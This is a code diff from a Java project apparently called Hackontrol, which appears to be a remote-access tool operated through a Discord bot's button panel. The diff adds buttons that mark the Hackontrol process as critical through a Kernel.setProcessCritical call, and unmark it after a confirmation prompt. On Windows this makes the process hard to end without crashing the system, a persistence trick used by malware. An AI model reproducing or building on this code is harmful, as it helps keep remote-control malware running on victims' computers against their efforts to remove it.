@@ -2,10 +2,14 @@ package com.khopan.hackontrol.panel;
 
 import com.khopan.hackontrol.Hackontrol;
 import com.khopan.hackontrol.library.Information;
+import com.khopan.hackontrol.library.Kernel;
 import com.khopan.hackontrol.registry.Registration;
 import com.khopan.hackontrol.service.interaction.ButtonManager;
 import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
+import com.khopan.hackontrol.service.interaction.InteractionManager;
 import com.khopan.hackontrol.service.interaction.StringSelectMenuManager;
+import com.khopan.hackontrol.service.interaction.context.Question;
+import com.khopan.hackontrol.service.interaction.context.Question.QuestionType;
 import com.khopan.hackontrol.utils.HackontrolMessage;
 
 import net.dv8tion.jda.api.OnlineStatus;
@@ -30,7 +34,14 @@ public class HackontrolPanel extends Panel {
 	public void registeration() {
 		this.register(Registration.BUTTON,             HackontrolPanel.BUTTON_PING,          context -> HackontrolMessage.deletable(context.reply(), this.getOnlineText(System.currentTimeMillis())));
 		this.register(Registration.BUTTON,             HackontrolPanel.BUTTON_STATUS,        context -> context.replyComponents(ActionRow.of(StringSelectMenuManager.staticMenu(HackontrolPanel.STRING_SELECT_STATUS).addOption("Online", DiscordStatus.ONLINE.name(), "Hackontrol will appear online").addOption("Idle", DiscordStatus.IDLE.name(), "Hackontrol will appear as idle").addOption("Do Not Disturb", DiscordStatus.DO_NOT_DISTURB.name(), "Hackontrol will appear as do not disturb").addOption("Invisible", DiscordStatus.INVISIBLE.name(), "Hackontrol will not appear online").setMaxValues(1).setDefaultValues(DiscordStatus.fromOnlineStatus(this.channel.getJDA().getPresence().getStatus()).name()).build())).queue());
-		this.register(Registration.BUTTON,             HackontrolPanel.BUTTON_HACKONTROL,    context -> {});
+		this.register(Registration.BUTTON,             HackontrolPanel.BUTTON_HACKONTROL,    buttonContext -> buttonContext.reply("**Hackontrol**").addActionRow(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Critical", context -> {
+			Kernel.setProcessCritical(true);
+			HackontrolMessage.delete(context);
+		}), ButtonManager.dynamicButton(ButtonType.DANGER, "Uncritical", context -> Question.positive(context.reply(), "Are you sure you want to remove the Hackontrol process from critical state?", QuestionType.YES_NO, () -> {
+			Kernel.setProcessCritical(false);
+			HackontrolMessage.delete(context);
+		}))).queue(InteractionManager :: callback));
+
 		this.register(Registration.STRING_SELECT_MENU, HackontrolPanel.STRING_SELECT_STATUS, context -> {
 			this.channel.getJDA().getPresence().setStatus(DiscordStatus.fromName(context.getValues().get(0)).status);
 			context.deferEdit().queue(hook -> hook.deleteOriginal().queue());
